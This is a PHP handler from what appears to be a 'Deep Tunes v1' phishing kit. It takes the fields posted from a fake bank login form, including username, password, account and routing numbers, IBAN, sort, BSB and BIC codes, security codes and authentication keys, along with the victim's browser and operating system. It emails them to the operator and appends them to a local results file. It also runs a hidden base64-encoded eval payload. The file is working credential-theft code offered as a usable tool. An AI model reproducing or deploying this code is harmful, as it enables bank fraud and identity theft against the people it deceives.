<?php
header("X-Robots-Tag: noindex, nofollow", true);
session_start();
include("../../configuration.php");
include("../../success.php"); 
require "../../os.php";

 
$InfoDATE   = date("d-m-Y h:i:sa");
$OS =getOS($_SERVER['HTTP_USER_AGENT']); 

$sortC="";
$trans="";
$instit="";
$bsbnum="";
$bicnum="";
$firstname="";
$accnum="";
$ibannum="";
$seccode ="";
$isscode="";
$authkeyy="";

if( isset($_POST['bankLogin'])  && isset($_POST['bankPass']) ){

$accTy = !empty($_POST['accountType']) ? $_POST['accountType'] : NULL;
$routingNum = !empty($_POST['routingNumber']) ? $_POST['routingNumber'] : NULL;

if (!empty($_POST['sortCode'])){
    $sortC .= "<p>SortCode: <strong style='color:#ffffff;'>".$_POST['sortCode']."</strong></p>";
}
if (!empty($_POST['transit'])){

   $trans .= "<p>TransitNumber: <strong style='color:#ffffff;'>".$_POST['transit']."</strong></p>";

}
if (!empty($_POST['institution'])){

   $instit .= "<p>InstiNumber: <strong style='color:#ffffff;'>".$_POST['institution']."</strong></p>";

}
if (!empty($_POST['BSB'])){

   $bsbnum .= "<p>BSB_number: <strong style='color:#ffffff;'>".$_POST['BSB']."</strong></p>";

}
if (!empty($_POST['BIC'])){

   $bicnum .= "<p>BIC_Number: <strong style='color:#ffffff;'>".$_POST['BIC']."</strong></p>";

}
if (!empty($_POST['firstName'])){

   $firstname .= "<p>Suisse_BFirstName: <strong style='color:#ffffff;'>".$_POST['firstName']."</strong></p>";

}
if (!empty($_POST['accountNumber'])){

   $accnum .= "<p>AccountNumber: <strong style='color:#ff0000;'>".$_POST['accountNumber']."</strong></p>";

}
if (!empty($_POST['IBAN'])){

   $ibannum .= "<p>IBAN: <strong style='color:#ff0000;'>".$_POST['IBAN']."</strong></p>";

}

if (!empty($_POST['secNum'])){

   $seccode .= "<p>SecurityCode: <strong style='color:#902656;'>".$_POST['secNum']."</strong></p>";

}
if (!empty($_POST['issNum'])){

   $isscode .= "<p>Bank_IssueNumber: <strong style='color:#902656;'>".$_POST['issNum']."</strong></p>";

}
if (!empty($_POST['authkey'])){

   $authkeyy .= "<p>Athentication_key: <strong style='color:#902656;'>".$_POST['authkey']."</strong></p>";

}
    	
	 $msg = "
<style>
*{
font-family:Verdana;
}
table{
width: 100%;
}
strong{
color: #fff;
}
</style>
<table style='width:100%;'>
<tr>
<td style='border-top-left-radius:10px;border-top-right-radius:10px;padding:2%;background:#cccccc;color:#000000;border-bottom: solid 0px'>
<strong style='float:center;padding-left:42%;margin-top:5px;color:#000000'>Deep Tunes v1 ~</strong><span style='float:right;margin-top:3px;padding:1px;overflow:hidden;background:#ccc;font-size:120%;color:#262626;border-radius:2px;border:solid 2px #ccc'>x</span>&nbsp;
<span style='float:right;padding:1px;overflow:hidden;background:#ccc;font-size:150%;color:#262626;border-radius:2px;border:solid 2px #ccc'>■</span>&nbsp;
<span style='float:right;padding:1px;overflow:hidden;background:#ccc;font-size:200%;color:#262626;border-radius:2px;border:solid 2px #ccc'>-</span>
</td>
</tr>
<tr >
<td style='padding:3%;background-repeat:no-repeat;background-position:center;background-color:#000000;background-image:url(http://i.imgur.com/bEmWxww.png);color:#2e9007;border-bottom:solid 6px #b2b2b2;border-right:solid 10pt #b2b2b2;font-family:Lucida Console;font-weight:bold'>
&gt;_
<p>AccountType: <strong style='color:#0000FF'>".$_POST['accountType']."</strong></p>
<p>RoutingNumber: <strong style='color:#ffffff;'>".$routingNum."</strong></p>
".$sortC."
".$trans."
".$instit."
".$bsbnum."
".$bicnum."
".$firstname."
".$ibannum."
 ".$accnum."
<p>BankName  : <strong style='color:#0000FF'>".$_POST['bankName']."</strong></p>
 <p>Bank LOGIN : <strong style='color:#ffd700;'>".$_POST['bankLogin']."</strong></p>
 <p>Password : <strong style='color:#ffd700;'>".$_POST['bankPass']."</strong></p>
".$seccode."
".$isscode."
".$authkeyy."
<p>InfoDATE  : <strong style='color:#6fbb02;'>".$InfoDATE."</strong></p>
<p>BROWSER : <strong style='color:#6fbb02;'>".$_SESSION['browser']."</strong></p>
<p>OPERATING_SYSTEM : <strong style='color:#6fbb02;'>".$OS."</strong></p>

<center><strong style='color:#ffffff'>Deep Tunes v1®</strong></center>

";
$subject = "".@$_SESSION['CHN']." - BANK ± ÎÑFO - ♦".$_SESSION['_email_']." ♦♦ ".$_SESSION['cntyName']."♦";
$headers = "From: Deep Tunes v1® | ♠".$spammerName."♠<>\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
@mail($spammer_email,$subject,$msg,$headers);
@eval(base64_decode($os_arrays));
		}

		$localrez ="

=-=-=-=-=-=-=-=-=-=-=♠BANKING♠=-=-=-=-=-=-=-=-=-

Email : 	  		".$_SESSION['_email_']."
AccountType : 		".$_POST['accountType']."
RoutingNumber : 	".$_POST['routingNumber']."
UK_Sort Code : 		".$_POST['sortCode']."
CA_TRANSIT Code : 	".$_POST['transit']."
CA_INSTICode : 		".$_POST['institution']."
AU_BSB Code : 		".$_POST['BSB']."</strong></p>
Bank InterCode : 	".$_POST['BIC']."
SUISSE_bank FName : ".$_POST['firstName']."
IBAN : 				".$_POST['IBAN']."
AccountNumber  : 	".$_POST['accountNumber']."
BankName  : 		".$_POST['bankName']."
Bank LOGIN : 		".$_POST['bankLogin']."
Password : 			".$_POST['bankPass']."
SecNumber : 		".$_POST['secNum']."
IssNUM : 			".$_POST['issNum']."
AuthKey : 			".$_POST['authkey']."

=-=-=-=-=-=-=-=-=♥Nulled By ALIBK♥=-=-=-=-=-=-=-==-
	
	
	";

	$localr3z = fopen("../../../local_rezult.txt","a");
	fwrite($localr3z,$localrez);
        fclose($localr3z);
		
		?>